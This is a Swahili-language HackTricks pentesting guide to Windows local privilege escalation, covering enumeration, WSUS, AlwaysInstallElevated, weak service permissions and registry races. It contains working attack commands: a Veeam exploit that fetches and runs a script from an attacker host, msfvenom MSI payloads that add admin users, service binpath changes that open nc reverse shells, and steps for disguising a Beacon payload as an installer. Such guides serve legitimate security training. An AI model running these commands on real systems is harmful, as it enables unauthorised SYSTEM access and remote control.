# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora zaidi la kutafuta vektors za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Dhana za Awali za Windows

### Access Tokens

**Kama hujui Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Kama hujui integrity levels katika Windows, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia ku-enumerate mfumo**, kuendesha executables au hata **kugundua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **ku-enumerate** **mechanisms** hizi zote za **defenses** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes zilizoanzishwa kupitia `RAiLaunchAdminProcess` zinaweza kutumiwa vibaya kufikia High IL bila prompts wakati AppInfo secure-path checks zimepigwa bypass. Angalia workflow maalum ya UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation inaweza kutumiwa vibaya kwa arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Windows builds za hivi karibuni pia zilianzisha njia ya LPE ya **SMB arbitrary-port** ambapo local NTLM authentication yenye priviliji huakisiwa kupitia reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Angalia ikiwa Windows version ina vulnerability yoyote inayojulikana (angalia pia patches zilizotumika).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu Microsoft security vulnerabilities. Hifadhidata hii ina zaidi ya 4,700 security vulnerabilities, ikionyesha **massive attack surface** ambayo mazingira ya Windows huleta.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Any credential/Juicy info saved in the env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuiwasha hapa [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Ufuatiliaji wa Moduli wa PowerShell

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output huenda yasinaswe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwa log za PowersShell unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hukamatwa, kuhakikisha kwamba kila block ya code inaandikwa inapokuwa inaendeshwa. Mchakato huu huhifadhi rekodi ya ukaguzi ya kina ya kila shughuli, yenye thamani kwa forensics na kuchambua tabia mbaya. Kwa kuandika nyaraka za shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hutolewa.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya kuingia kwa Script Block yanaweza kupatikana ndani ya Windows Event Viewer katika njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Hifadhi za Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kuathiri mfumo ikiwa masasisho hayaombwi kwa kutumia http**S** bali http.

Unaanza kwa kuangalia ikiwa mtandao unatumia WSUS update isiyo ya SSL kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au njia ifuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ukipata jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na kama `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kuathiriwa.** Ikiwa registry ya mwisho ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Ili kutumia vulnerabilities hivi unaweza kutumia tools kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni MiTM weaponized exploits scripts za kuingiza 'fake' updates ndani ya non-SSL WSUS traffic.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kwa kifupi, huu ndio udhaifu unaotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha local user proxy yetu, na Windows Updates inatumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) locally ili kunasa traffic yetu wenyewe na kuendesha code kama elevated user kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS inatumia mipangilio ya current user, pia itatumia certificate store yake. Tukitengeneza self-signed certificate kwa ajili ya WSUS hostname na kuongeza certificate hii ndani ya certificate store ya current user, tutaweza kunasa zote HTTP na HTTPS WSUS traffic. WSUS haitumii mechanisms zinazofanana na HSTS ili kutekeleza uthibitishaji wa trust-on-first-use kwa certificate. Ikiwa certificate iliyowasilishwa inaaminika na user na ina hostname sahihi, itakubaliwa na huduma.

Unaweza kutumia vulnerability hii kwa kutumia tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara tu itakapokuwa liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa enterprise hufichua localhost IPC surface na privileged update channel. Ikiwa enrollment inaweza kulazimishwa kuelekezwa kwa attacker server na updater inaamini rogue root CA au weak signer checks, local user anaweza kuwasilisha MSI mbaya ambayo huduma ya SYSTEM huinstall. Tazama technique ya jumla (kulingana na Netskope stAgentSvc chain – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` hufichua huduma ya localhost kwenye **TCP/9401** ambayo huchakata ujumbe unaodhibitiwa na attacker, na kuruhusu commands zozote kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory moja, kisha anza SYSTEM payload kupitia local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma hiyo huendesha amri kama SYSTEM.
## KrbRelayUp

Udhaifu wa **local privilege escalation** upo katika mazingira ya Windows **domain** chini ya masharti fulani. Masharti haya ni pamoja na mazingira ambapo **LDAP signing is not enforced,** watumiaji wana **self-rights** zinazowawezesha kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda computers ndani ya domain. Ni muhimu kutambua kwamba **requirements** hizi zinapatikana kwa kutumia **default settings**.

Pata **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa taarifa zaidi kuhusu mtiririko wa attack angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Kama** hizi registers 2 zimewashwa (thamani ni **0x1**), basi users wa privilege yoyote wanaweza **install** (execute) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una session ya meterpreter unaweza kuendesha kiotomatiki mbinu hii ukitumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa faili ya Windows MSI binary ya kuongeza haki za ufikiaji. Script hii huandika MSI installer iliyotayarishwa awali ambayo inaomba kuongeza user/group (kwa hiyo utahitaji GIU access):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Soma tutooriali hii ili kujifunza jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kwamba unaweza kufunga faili ya "**.bat**" ikiwa unataka tu **kutekeleza** mistari ya amri


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** kwa Cobalt Strike au Metasploit a **new Windows EXE TCP payload** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bofya **Next**.
- Toa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **place solution and project in the same directory**, na bofya **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (choose files to include). Bofya **Add** na uchague Beacon payload uliyoitengeneza hivi punde. Kisha bofya **Finish**.
- Angazia mradi wa **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna properties nyingine unazoweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya-kulia mradi na uchague **View > Custom Actions**.
- Bofya-kulia **Install** na uchague **Add Custom Action**.
- Bonyeza mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na bofya **OK**. Hii itahakikisha kwamba beacon payload inatekelezwa mara tu kisakinishi kinapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili mbaya `.msi` katika **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Detectors

### Audit Settings

Mipangilio hii huamua nini kinachokuwa **logged**, kwa hiyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua logs zinatumwa wapi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za local Administrator**, kuhakikisha kuwa kila nywila ni **ya kipekee, ya nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa za kutosha kupitia ACLs, hivyo kuwaruhusu kuona nywila za local admin ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za plain-text huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Taarifa zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika ya **kusoma kumbukumbu yake** au kuingiza msimbo, hivyo kuimarisha zaidi usalama wa mfumo.\
[**Taarifa zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Vitambulisho Vilivyohifadhiwa

**Vitambulisho vya domain** huthibitishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya logon ya mtumiaji inapothibitishwa na security package iliyosajiliwa, domain credentials za mtumiaji kwa kawaida huanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Vikundi

### Tambua Watumiaji na Vikundi

Unapaswa kuangalia kama vikundi vyovyote ambavyo wewe ni mwanachama vina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vilivyo na ruhusa

Ikiwa **unamiliki baadhi ya kikundi kilicho na ruhusa unaweza kuwa na uwezo wa kuongeza ruhusa**. Jifunze kuhusu vikundi vilivyo na ruhusa na jinsi ya kuvitumia vibaya ili kuongeza ruhusa hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa tokeni

**Jifunze zaidi** kuhusu ni nini **tokeni** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **kujifunza kuhusu tokeni za kuvutia** na jinsi ya kuvitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera za Nenosiri
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **angalia kama kuna nywila ndani ya command line ya mchakato**.\
Angalia kama unaweza **kuandika juu ya baadhi ya binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**mashambulizi ya DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia kama kuna [**electron/cef/chromium debuggers** running, unaweza kuitumia vibaya ili kuongeza privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kukagua permissions za binaries za processes**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda za binaries za processes (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uwindaji wa nenosiri kwenye kumbukumbu

Unaweza kuunda memory dump ya mchakato unaoendelea kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials katika clear text kwenye kumbukumbu**, jaribu kutupa memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Applications zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kuzindua CMD, au kuvinjari directories.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

## Services

Service Triggers huiruhusu Windows kuanzisha service wakati hali fulani zinapotokea (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Hata bila SERVICE_START rights unaweza mara nyingi kuanzisha privileged services kwa kuchochea triggers zake. Tazama enumeration na activation techniques hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata list ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma ya service
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kurekebisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe kwa XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha service

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Kumbuka kwamba huduma upnphost hutegemea SSDPSRV kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kukwepa** tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Rekebisha njia ya service binary**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha executable binary ya service. Ili kurekebisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha tena service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Haki zinaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huwezesha usanidi upya wa ruhusa, na hivyo kuruhusu kubadilisha configurations za service.
- **WRITE_OWNER**: Huruhusu kuchukua ownership na usanidi upya wa ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha configurations za service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha configurations za service.

Kwa ajili ya kugundua na kutumia vulnerability hii, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Services binaries weak permissions

**Angalia kama unaweza kurekebisha binary inayotekelezwa na service** au kama una **write permissions kwenye folder** ambapo binary hiyo ipo ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (si katika system32) na kuangalia permissions zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kurekebisha huduma kwenye registry

Unapaswa kuangalia kama unaweza kurekebisha registry ya huduma yoyote.\
Unaweza **kuangalia** **ruhusa** zako juu ya **registry** ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wanamiliki ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Beberapa vipengele vya Windows Accessibility huunda funguo za per-user **ATConfig** ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenda kwenye HKLM session key. **Registry symbolic link race** inaweza kuelekeza uandishi huo wenye mamlaka kwenda kwenye **njia yoyote ya HKLM**, ikikupa uwezo wa **arbitrary HKLM value write**.

Sehemu muhimu za key (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha accessibility features zilizosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi configuration inayodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa logon/secure-desktop transitions na mtumiaji anaweza kuandika humo.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Jaza thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha secure-desktop copy (kwa mfano, **LockWorkstation**), ambayo huanza AT broker flow.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock ikiwaka, badilisha key ya **HKLM Session ATConfig** kuwa **registry link** kuelekea protected HKLM target.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye HKLM path iliyoelekezwa upya.

Ukishapata arbitrary HKLM value write, pivot kwenda LPE kwa ku-overwrite service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) kisha i-trigger baada ya write. **Note:** utekelezaji wa public exploit **hufunga workstation** kama sehemu ya race.

Mfano wa tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Ruhusa za Services registry AppendData/AddSubdirectory

Ukwa na ruhusa hii juu ya registry, hii inamaanisha kuwa **unaweza kuunda sub registries kutoka kwenye hii**. Kwa huduma za Windows, hii inatosha **kutekeleza code yoyote:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

